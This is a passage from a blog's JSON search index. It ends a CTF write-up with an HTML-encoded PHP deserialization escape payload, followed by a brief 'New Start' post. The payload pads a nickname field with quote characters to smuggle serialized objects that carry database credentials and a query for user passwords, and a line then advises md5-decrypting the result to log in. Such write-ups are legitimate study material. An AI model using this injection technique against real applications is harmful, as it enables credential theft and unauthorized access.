1age&#x3D;&amp;nickname&#x3D;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:2:&#123;s:3:&quot;age&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:6:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:7:&quot;noob123&quot;;s:6:&quot;dbpass&quot;;s:7:&quot;noob123&quot;;s:8:&quot;database&quot;;s:7:&quot;noob123&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username&#x3D;?&quot;;&#125;&#125;&#125; md5解密登录即可 参考链接: http://p3rh4ps.top/index.php/2020/02/21/820-2-21-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b%e5%87%ba%e9%a2%98%e7%ac%94%e8%ae%b0/?tdsourcetag=s_pctim_aiomsg","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"New Start","slug":"start","date":"2020-02-20T11:17:40.000Z","updated":"2020-02-20T11:59:16.262Z","comments":true,"path":"2020/02/20/start/","link":"","permalink":"https://glotozz.github.io/2020/02/20/start/","excerpt":"","text":"。即是终点也是起点","categories":[],"tags":[]}]}